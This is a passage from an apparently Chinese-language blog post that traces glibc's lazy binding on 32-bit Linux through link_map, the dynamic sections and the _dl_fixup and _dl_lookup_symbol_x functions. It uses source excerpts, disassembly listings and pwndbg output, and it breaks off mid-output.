<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>然后通过<code>link_map</code>找到<code>.dynamic</code>的地址，其中第三个地址就是<code>.dynamic</code>的地址，即<code>0x8049694</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236501.png" alt="image-20220627172804628"></p>
<p>然后通过<code>.dynamic</code>来找到<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="number">5</span>] .dynsym           DYNSYM          <span class="number">080481</span>ac <span class="number">0001</span>ac <span class="number">000060</span> <span class="number">10</span>   A  <span class="number">6</span>   <span class="number">1</span>  <span class="number">4</span></span><br><span class="line">[ <span class="number">6</span>] .dynstr           STRTAB          <span class="number">0804820</span>c <span class="number">00020</span>c <span class="number">000051</span> <span class="number">00</span>   A  <span class="number">0</span>   <span class="number">0</span>  <span class="number">1</span></span><br><span class="line">[<span class="number">10</span>] .rel.plt          REL             <span class="number">08048294</span> <span class="number">000294</span> <span class="number">000018</span> <span class="number">08</span>  AI  <span class="number">5</span>  <span class="number">23</span>  <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236502.png" alt="image-20220627174442237"></p>
<ul>
<li>.dynsym位于.dynamic的8*9+4=76=0x4c  </li>
<li>.dynstr位于.dynamic的8*8+4=68=0x44</li>
<li>.rel.plt位于.dynamic的16*8+4=132=0x84</li>
</ul>
<p>然后用<code>.rel.plt</code>的地址加上参数<code>reloc_index</code>，即<code>0x08048294+0=0x08048294</code>找到函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236503.png" alt="image-20220627180624213"></p>
<ul>
<li>这里<code>rel</code>为<code>0x08048294</code>，所以</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r_offset = 0x804a00c</span><br><span class="line">r_info = 107h</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236504.png" alt="image-20220627180932277"></p>
<ul>
<li>通过<code>Elf32_rel</code>结构的<code>r_info &gt;&gt; 8 =&gt; 107h &gt;&gt; 8 = 1</code> 作为<code>.dynsym</code>中的下标</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;       <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;        <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;       <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section st_shndx;       <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236505.png" alt="image-20220627181037136"></p>
<p>查看0x080481BC内存，找到printf在.dynstr表项中的索引为0x1f，所以st_name的地址为0x0804820c+0x1f=0x0804822B</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236506.png" alt="image-20220627184040664"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LOAD:<span class="number">0804820</span>C ; ELF String Table</span><br><span class="line">LOAD:<span class="number">0804820</span>C byte_804820C    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">0804820</span>C                                         ; LOAD:<span class="number">080481</span>CC↑o ...</span><br><span class="line">LOAD:<span class="number">0804820</span>D aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804826</span>C↓o</span><br><span class="line">LOAD:<span class="number">08048217</span> aIoStdinUsed    db <span class="string">&#x27;_IO_stdin_used&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481F</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048226</span> aPuts           db <span class="string">&#x27;puts&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">080481</span>CC↑o</span><br><span class="line">LOAD:<span class="number">0804822B</span> aPrintf         db <span class="string">&#x27;printf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048232</span> aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08048232</span>                                         ; DATA XREF: LOAD:<span class="number">080481</span>EC↑o</span><br><span class="line">LOAD:<span class="number">08048244</span> aGlibc20        db <span class="string">&#x27;GLIBC_2.0&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804827</span>C↓o</span><br><span class="line">LOAD:<span class="number">0804824</span>E aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481</span>DC↑o</span><br><span class="line">LOAD:<span class="number">0804825</span>D                 align <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236507.png" alt="image-20220627184824722"></p>
<p>最后在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即<code>GOT</code>表就可以了</p>
<h4 id="dl-fixup执行流程"><a href="#dl-fixup执行流程" class="headerlink" title="_dl_fixup执行流程"></a>_dl_fixup执行流程</h4><p>这里引入glibc源码进行调试，具体引入过程可参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/hagsy9#rBtjJ">https://www.yuque.com/cyberangel/rg9gdm/hagsy9#rBtjJ</a></p>
<p>_dl_fixup函数的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">	   struct link_map *l, ElfW(Word) reloc_arg)</span><br></pre></td></tr></table></figure>

<p>忽略掉宏定义的部分，实际上真正有用的是后两个参数：struct link_map *l, ElfW(Word) reloc_arg：</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236508.png" alt="image-20220627212022381"></p>
<p>进入_dl_fixup函数，先看开头的一小部分代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="keyword">const</span> symtab   </span></span><br><span class="line"><span class="function">  </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);                   <span class="comment">//获取symtab即.dynsym节的起始地址：0x080481ac</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  <span class="comment">//获取strtab即.dynstr节的起始地址：0x0804820c</span></span><br></pre></td></tr></table></figure>

<p>这里的D_PTR函数具有两个参数，一个是link_map的第一个结点地址，一个是link_map第一个结点中的l_info成员；link_map的作用之前说过，它是记录程序加载的所有共享库的信息，其中的l_info为一个指针数组，它记录了_DYNAMIC节中每一个Elf32_Dyn的所在地址（DT_SYMTAB等都是宏定义）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236509.png" alt="image-20220627212636281"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DT_SYMTAB、DT_STRTAB、DT_JMPREL、DT_VERSYM的宏定义都在/elf/elf.h中：</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB	6		<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB	5		<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL	20		<span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_VERSYM	0x6ffffff0</span></span><br><span class="line"><span class="comment">//也就是说可以通过这些常量来确定程序某一section的地址</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236510.png" alt="image-20220627212907042"></p>
<p>继续往下看</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc   </span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); <span class="comment">//reloc==0x8048294</span></span><br><span class="line">	<span class="comment">//这里搜寻DT_JMPREL的地址，然后与reloc_offset（即reloc_arg）相加，找到该符号在ELF JMPREL Relocation Table中对应的指针    </span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]; </span><br><span class="line">	<span class="comment">//使用之前寻找到的symtab利用(reloc-&gt;r_info)&gt;&gt;8的结果当作下标以搜寻对应的符号在ELF Symbol Table中的地址：sym==0x80481bc</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym; <span class="comment">//refsym== (const Elf32_Sym *) 0x80481bc</span></span><br><span class="line"></span><br><span class="line">=======================================================================================</span><br><span class="line">pwndbg&gt; p/x *sym</span><br><span class="line">$<span class="number">11</span> = &#123;</span><br><span class="line">  st_name = <span class="number">0x1f</span>, </span><br><span class="line">  st_value = <span class="number">0x0</span>, </span><br><span class="line">  st_size = <span class="number">0x0</span>, </span><br><span class="line">  st_info = <span class="number">0x12</span>, </span><br><span class="line">  st_other = <span class="number">0x0</span>, </span><br><span class="line">  st_shndx = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p/x sym</span><br><span class="line">$<span class="number">12</span> = <span class="number">0x80481bc</span></span><br><span class="line">pwndbg&gt; p/x &amp;sym</span><br><span class="line">$<span class="number">13</span> = <span class="number">0xffffcf54</span></span><br><span class="line"></span><br><span class="line">LOAD:<span class="number">080481</span>AC ; ELF Symbol Table</span><br><span class="line">LOAD:<span class="number">080481</span>AC                 Elf32_Sym &lt;<span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481B</span>C                 Elf32_Sym &lt;offset aPrintf - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;printf&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>CC                 Elf32_Sym &lt;offset aPuts - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;puts&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>DC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>h, <span class="number">0</span>, <span class="number">0</span>&gt; ; <span class="string">&quot;__gmon_start__&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>EC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804820C, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>h, <span class="number">0</span>, \ ; <span class="string">&quot;__libc_start_main&quot;</span></span><br><span class="line">LOAD:<span class="number">080481</span>EC                            <span class="number">0</span>&gt;</span><br><span class="line">LOAD:<span class="number">080481F</span>C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804820C, \ ; <span class="string">&quot;_IO_stdin_used&quot;</span></span><br><span class="line">LOAD:<span class="number">080481F</span>C                            offset _IO_stdin_used, <span class="number">4</span>, <span class="number">11</span>h, <span class="number">0</span>, <span class="number">10</span>h&gt;</span><br><span class="line">LOAD:<span class="number">0804820</span>C ; ELF String Table</span><br><span class="line">LOAD:<span class="number">0804820</span>C byte_804820C    db <span class="number">0</span>                    ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">0804820</span>C                                         ; LOAD:<span class="number">080481</span>CC↑o ...</span><br><span class="line">LOAD:<span class="number">0804820</span>D aLibcSo6        db <span class="string">&#x27;libc.so.6&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804826</span>C↓o</span><br><span class="line">LOAD:<span class="number">08048217</span> aIoStdinUsed    db <span class="string">&#x27;_IO_stdin_used&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481F</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048226</span> aPuts           db <span class="string">&#x27;puts&#x27;</span>,<span class="number">0</span>             ; DATA XREF: LOAD:<span class="number">080481</span>CC↑o</span><br><span class="line">LOAD:<span class="number">0804822B</span> aPrintf         db <span class="string">&#x27;printf&#x27;</span>,<span class="number">0</span>           ; DATA XREF: LOAD:<span class="number">080481B</span>C↑o</span><br><span class="line">LOAD:<span class="number">08048232</span> aLibcStartMain  db <span class="string">&#x27;__libc_start_main&#x27;</span>,<span class="number">0</span></span><br><span class="line">LOAD:<span class="number">08048232</span>                                         ; DATA XREF: LOAD:<span class="number">080481</span>EC↑o</span><br><span class="line">LOAD:<span class="number">08048244</span> aGlibc20        db <span class="string">&#x27;GLIBC_2.0&#x27;</span>,<span class="number">0</span>        ; DATA XREF: LOAD:<span class="number">0804827</span>C↓o</span><br><span class="line">LOAD:<span class="number">0804824</span>E aGmonStart      db <span class="string">&#x27;__gmon_start__&#x27;</span>,<span class="number">0</span>   ; DATA XREF: LOAD:<span class="number">080481</span>DC↑o</span><br><span class="line">LOAD:<span class="number">0804825</span>D                 align <span class="number">2</span></span><br><span class="line">LOAD:<span class="number">0804825</span>E ; ELF GNU Symbol Version Table</span><br><span class="line">=======================================================================================</span><br><span class="line">参数reloc_offset定义如下：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> reloc_offset</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_offset reloc_arg</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">函数R_SYM的定义如下：</span><br><span class="line"><span class="comment">//glibc-2.27/elf/elf.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_R_SYM(val)		((val) &gt;&gt; 8)</span></span><br><span class="line">函数D_PTR的定义如下：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">=======================================================================================</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);   <span class="comment">//rel_addr== 0x804978c，地址是print函数对应的got地址		  </span></span><br><span class="line">		<span class="comment">//l-&gt;l_addr==0:该成员在第一个link_map结构体中为0，其余的都是代表各个动态链接库的基地址</span></span><br><span class="line">		<span class="comment">//reloc-&gt;r_offset：其取值是符号需要重定位的虚拟地址（即IDA中got表地址）</span></span><br><span class="line">	    <span class="comment">//l-&gt;l_addr + reloc-&gt;r_offset为.got.plt地址。</span></span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);   <span class="comment">//ELF_MACHINE_JMP_SLOT==0x7</span></span><br><span class="line"><span class="comment">//宏函数定义在：//glibc-2.27/elf/elf.h</span></span><br><span class="line"><span class="comment">//#define ELF32_R_TYPE(val)		((val) &amp; 0xff)</span></span><br></pre></td></tr></table></figure>

<p><code>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</code>检查rel-&gt;r_info是否为7</p>
<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236511.png" alt="image-20220628095643026"></p>
<p>接下来是一个if判断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">    used don&#x27;t look in the global scope.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) <span class="comment">//判断(sym-&gt;st_other)&amp;0x03是否为0</span></span><br><span class="line">  &#123;</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//不为0</span></span><br><span class="line">  &#123;</span><br><span class="line">     ......</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>之前说过，st_other成员到现在为止的定义恒为0，所以0&amp;0x03仍为0，此处一定会进入if语句，先来看第一部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>; <span class="comment">//初始化当前符号版本指针为NULL</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) <span class="comment">//通过l_info来进行寻址</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">	    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     <span class="comment">//vernum==0x8048248</span></span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; <span class="comment">//ndx==2</span></span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];                                 <span class="comment">//获取当前所解析符号的版本信息，version==0xf7fd0410</span></span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    version = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">pwndbg&gt; p *version</span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  name = <span class="number">0x8048244</span> <span class="string">&quot;GLIBC_2.0&quot;</span>, </span><br><span class="line">  hash = <span class="number">225011984</span>, </span><br><span class="line">  hidden = <span class="number">0</span>, </span><br><span class="line">  filename = <span class="number">0x804820d</span> <span class="string">&quot;libc.so.6&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码是搜索所解析符号的版本信息，在伪造结构体时可能会出现数组越界的情况访问到无效地址，这里暂且不谈。继续向下走，来到一个重点函数_dl_lookup_symbol_x：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>); <span class="comment">//strtab+sym-&gt;st_name==0x804822b；</span></span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202207032236512.png" alt="image-20220628102759648"></p>
<p>_dl_lookup_symbol_x函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lookup_t</span></span><br><span class="line">_dl_lookup_symbol_x (<span class="keyword">const</span> <span class="keyword">char</span> *undef_name, struct link_map *undef_map,</span><br><span class="line">		     <span class="keyword">const</span> ElfW(Sym) **ref,</span><br><span class="line">		     struct r_scope_elem *symbol_scope[],</span><br><span class="line">		     <span class="keyword">const</span> struct r_found_version *version,</span><br><span class="line">		     <span class="keyword">int</span> type_class, <span class="keyword">int</span> flags, struct link_map *skip_map)</span><br></pre></td></tr></table></figure>

<ul>
<li>arg[0]：所要寻址符号的字符串指针（指针属于ELF String Table即.dynstr  section）</li>
<li>arg[1]：传入_dl_fixup的链表指针，在这里指向链表的第一个结构体</li>
<li>arg[2]：sym是符号printf在.dynsym  section中对应的Elf32_Sym指针，&amp;sym是这个指针的所在地址</li>
<li>arg[3]：l-&gt;l_scope定义了要查找的符号所在link_map的范围，默认只向后查找3个结点（结构体）（r_nlist），开始查找的起点为r_list：</li>
<li>arg[4]：此符号的版本信息（如果version-&gt;hash==0则version为NULL）</li>
<li>arg[5]：ELF_RTYPE_CLASS_PLT：宏定义在glibc-2.27/sysdeps/generic/ldsodefs.h中，默认值为1</li>
<li>arg[6]：无需知其作用</li>
<li>arg[7]：需要跳过的，不用搜索的link_map结构体指针</li>
</ul>
<p><code>_dl_lookup_symbol_x</code>是利用传入符号的字符串指针去查找对应的动态链接库；_dl_lookup_symbol_x的返回值result是一个link_map指针，其中result-&gt;l_addr为libc的基地址：</p>
<p><code> ElfW(Addr) l_addr;        /* Difference between the address in the ELF                    file and the addresses in memory.  */</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p result</span><br><span class="line">$<span class="number">5</span> = (<span class="keyword">lookup_t</span>) <span class="number">0xf7fd0110</span></span><br><span class="line">pwndbg&gt; p/x  *result</span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  l_addr = <span class="number">0xf7ddf000</span>, </span><br><span class="line">  l_name = <span class="number">0xf7fd00f0</span>, </span><br><span class="line">  l_ld = <span class="number">0xf7fb6d8c</span>, </span><br><span class="line">  l_next = <span class="number">0xf7ffd558</span>, </span><br><span class="line">  l_prev = <span class="number">0xf7ffdc30</span>, </span><br><span class="line">  l_real = <span class="number">0xf7fd0110</span>, </span><br><span class="line">  l_ns = <span class="number">0x0</span>, </span><br><span class="line">  l_libname = <span class="number">0xf7fd0370</span>, </span><br><span class="line">  l_info = &#123;<span class="number">0x0</span>, <span class="number">0xf7fb6d8c</span>, <span class="number">0xf7fb6dec</span>, <span class="number">0xf7fb6de4</span>, <span class="number">0xf7fb6db4</span>, <span class="number">0xf7fb6dc4</span>, <span class="number">0xf7fb6dcc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6dd4</span>, <span class="number">0xf7fb6ddc</span>, <span class="number">0xf7fb6d9c</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6d94</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf7fb6e04</span>, 